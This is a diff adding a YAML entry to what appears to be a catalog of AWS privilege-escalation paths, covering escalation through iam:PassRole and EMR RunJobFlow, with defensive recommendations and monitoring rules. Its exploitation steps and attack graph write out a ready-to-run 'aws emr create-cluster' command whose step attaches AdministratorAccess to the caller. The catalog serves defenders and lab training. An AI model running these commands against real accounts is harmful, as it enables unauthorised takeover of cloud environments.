@@ -1,0 +1,261 @@
+id: emr-001
+name: iam:PassRole + elasticmapreduce:RunJobFlow
+category: new-passrole
+services:
+  - iam
+  - emr
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass both the EC2 instance profile role and the EMR service role to the EMR service
+    - permission: elasticmapreduce:RunJobFlow
+      resourceConstraints: No resource constraints required
+  additional:
+    - permission: elasticmapreduce:DescribeCluster
+      resourceConstraints: Useful for polling cluster state to confirm execution
+    - permission: elasticmapreduce:DescribeStep
+      resourceConstraints: Useful for verifying step execution status
+    - permission: elasticmapreduce:ListClusters
+      resourceConstraints: Helpful for discovering existing clusters
+    - permission: elasticmapreduce:ListSteps
+      resourceConstraints: Useful for monitoring step execution
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole` and `elasticmapreduce:RunJobFlow` can escalate privileges by creating an EMR cluster and passing an admin IAM role as the EC2 instance profile (`JobFlowRole`). An EMR step using `command-runner.jar` executes on the cluster's EC2 master node, which has access to the admin instance profile credentials via the EC2 Instance Metadata Service (IMDS). The step calls `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user, then the cluster auto-terminates.
+
+prerequisites:
+  admin:
+    - A role must exist that can be used as an EC2 instance profile and trusts ec2.amazonaws.com
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+    - A role must exist that can serve as the EMR service role (trusts elasticmapreduce.amazonaws.com)
+    - The AWS EMR service-linked role (AWSServiceRoleForEMRCleanup) must exist in the account
+  lateral:
+    - A role must exist that can be used as an EC2 instance profile and has elevated permissions
+    - A role must exist that can serve as the EMR service role
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        aws emr create-cluster \
+          --name "privesc-cluster" \
+          --release-label emr-7.0.0 \
+          --applications Name=Hadoop \
+          --instance-type m5.xlarge \
+          --instance-count 1 \
+          --service-role EMR_SERVICE_ROLE \
+          --ec2-attributes "InstanceProfile=ADMIN_INSTANCE_PROFILE" \
+          --steps '[{
+            "Name": "Escalate",
+            "ActionOnFailure": "TERMINATE_CLUSTER",
+            "Type": "CUSTOM_JAR",
+            "Jar": "command-runner.jar",
+            "Args": [
+              "bash", "-c",
+              "aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+            ]
+          }]' \
+          --auto-terminate
+      description: Create an EMR cluster passing the admin role as the EC2 instance profile (JobFlowRole). The cluster step uses command-runner.jar to execute the AWS CLI with the instance profile's admin credentials to attach AdministratorAccess to the starting user. The cluster auto-terminates after the step completes.
+    - step: 2
+      command: |
+        aws emr describe-cluster \
+          --cluster-id CLUSTER_ID \
+          --query 'Cluster.Status.State' \
+          --output text
+      description: Poll cluster state. EMR clusters take 5-15 minutes to provision, execute the step, and auto-terminate. Watch for TERMINATED (success) or TERMINATED_WITH_ERRORS (failure).
+    - step: 3
+      command: |
+        aws emr describe-cluster \
+          --cluster-id CLUSTER_ID \
+          --query 'Cluster.Status.StateChangeReason' \
+          --output json
+      description: If the cluster fails, check StateChangeReason for diagnostic information about what prevented the step from executing.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative EMR instance profiles** - Very rarely does an EMR cluster need administrative access. Use the principle of least privilege and scope instance profiles to only the data buckets and services the cluster legitimately requires.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificEMRRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "elasticmapreduce.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - Monitor CloudTrail for unusual EMR cluster creation followed by IAM policy attachment events
+  - Monitor CloudTrail for EMR cluster creation by principals who do not usually create clusters
+  - Monitor CloudTrail for roles being passed to EMR that haven't been used before
+  - Monitor and alert on EMR cluster creation with privileged instance profiles
+  - Regularly audit EMR instance profiles for excessive IAM permissions
+  - Regularly audit all IAM roles that trust ec2.amazonaws.com and are used as EMR instance profiles
+
+limitations: |
+  This path provides administrative access only if the passed instance profile role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks. EMR clusters take 5-15 minutes to provision, making this a slower escalation path compared to serverless alternatives.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by Amazon EMR - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonemr.html"
+  - title: "Configure IAM service roles for Amazon EMR - Amazon EMR"
+    url: "https://docs.aws.amazon.com/emr/latest/ManagementGuide/emr-iam-roles.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/emr-001-iam-passrole+elasticmapreduce-runjobflow"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: |
+        The principal with iam:PassRole and elasticmapreduce:RunJobFlow permissions. Can be an IAM user or role.
+
+    - id: emr_cluster
+      label: New EMR Cluster
+      type: resource
+      description: |
+        New EMR cluster created with a privileged IAM instance profile passed as the JobFlowRole. The cluster also requires an EMR service role (ServiceRole) and the AWSServiceRoleForEMRCleanup service-linked role. Once provisioned, the EC2 master node runs with the instance profile's credentials accessible via IMDS, and any EMR step submitted at creation time executes on that node using those credentials.
+
+    - id: ec2_instance
+      label: EC2 Master Node
+      type: resource
+      description: |
+        The EMR cluster's EC2 master node, which runs with the privileged instance profile attached. Credentials for the instance profile role are available via the EC2 Instance Metadata Service at http://169.254.169.254/latest/meta-data/iam/security-credentials/. EMR step processes launched on this node automatically inherit these credentials through the AWS CLI's default credential chain.
+
+    - id: admin_role
+      label: Admin Instance Profile Role
+      type: principal
+      description: |
+        IAM role passed to the EMR cluster as the EC2 instance profile (JobFlowRole). The role must trust ec2.amazonaws.com and have a corresponding instance profile resource. The master node assumes this role at boot time, making its temporary credentials available to all processes running on the node, including EMR step commands.
+
+    - id: emr_step
+      label: EMR Step (command-runner.jar)
+      type: payload
+      color: '#99ccff'
+      description: |
+        Malicious EMR step submitted at cluster creation time using command-runner.jar as the JAR. The step executes an AWS CLI command on the master node using the instance profile's credentials, which are automatically present in the execution environment.
+
+        Example step configuration passed to `--steps`:
+        ```json
+        {
+          "Name": "Escalate",
+          "ActionOnFailure": "TERMINATE_CLUSTER",
+          "Type": "CUSTOM_JAR",
+          "Jar": "command-runner.jar",
+          "Args": [
+            "bash", "-c",
+            "aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+          ]
+        }
+        ```
+
+        The `--auto-terminate` cluster flag causes the cluster to shut down after the step completes.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: |
+        The instance profile role has AdministratorAccess or equivalent permissions. The EMR step successfully calls iam:AttachUserPolicy, elevating the starting principal to full administrative access. The cluster auto-terminates after the step completes.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        The instance profile role has some elevated permissions but not full admin. The EMR step can leverage these permissions to read sensitive data from S3, access Secrets Manager, modify infrastructure within the role's scope, or stage further privilege escalation attempts.
+
+    - id: no_access
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        The instance profile role only has minimal permissions. The EMR step cannot perform meaningful privilege escalation. This outcome may also occur if the required EMR service-linked role (AWSServiceRoleForEMRCleanup) does not exist in the account, which prevents cluster provisioning entirely.
+
+  edges:
+    - from: start
+      to: emr_cluster
+      label: iam:PassRole + elasticmapreduce:RunJobFlow
+      description: |
+        Create a new EMR cluster, passing the admin role as the EC2 instance profile (JobFlowRole) and an EMR service role (ServiceRole). The malicious step is included at creation time and `--auto-terminate` ensures cleanup after execution.
+
+        Command:
+        ```bash
+        aws emr create-cluster \
+          --name "privesc-cluster" \
+          --release-label emr-7.0.0 \
+          --applications Name=Hadoop \
+          --instance-type m5.xlarge \
+          --instance-count 1 \
+          --service-role EMR_SERVICE_ROLE \
+          --ec2-attributes "InstanceProfile=ADMIN_INSTANCE_PROFILE" \
+          --steps '[{
+            "Name": "Escalate",
+            "ActionOnFailure": "TERMINATE_CLUSTER",
+            "Type": "CUSTOM_JAR",
+            "Jar": "command-runner.jar",
+            "Args": ["bash", "-c", "aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
+          }]' \
+          --auto-terminate
+        ```
+
+    - from: emr_cluster
+      to: ec2_instance
+      label: Cluster provisions EC2 master node with instance profile
+      description: |
+        The EMR service provisions EC2 instances for the cluster and attaches the specified instance profile to the master node. This process takes 5-15 minutes. Once the node is running, the instance profile role's temporary credentials are available via IMDS.
+
+    - from: ec2_instance
+      to: admin_role
+      label: Node accesses role credentials via IMDS
+      description: |
+        The EC2 master node accesses the instance profile role's temporary credentials via the Instance Metadata Service. The AWS CLI and SDKs running on the node automatically discover and use these credentials. EMR step processes inherit this credential context without any additional configuration.
+
+    - from: admin_role
+      to: emr_step
+      label: Step executes with role credentials
+      description: |
+        The EMR step using command-runner.jar executes on the master node. Because the AWS CLI is pre-installed on EMR nodes and the instance profile credentials are available in the environment, the step can immediately invoke AWS API calls with the instance profile's permissions.
+
+    - from: emr_step
+      to: admin
+      label: If role has admin or IAM write permissions
+      branch: A
+      condition: admin
+      description: |
+        If the instance profile role has AdministratorAccess or IAM write permissions (iam:AttachUserPolicy), the step successfully attaches AdministratorAccess to the starting principal. The cluster then auto-terminates, completing the privilege escalation.
+
+    - from: emr_step
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: |
+        If the instance profile role has elevated but non-admin permissions, the step can still access sensitive data, perform data exfiltration, or modify infrastructure resources within the role's scope.
+
+    - from: emr_step
+      to: no_access
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: |
+        If the instance profile role only has minimal permissions, the step cannot perform meaningful privilege escalation despite executing successfully on the master node.
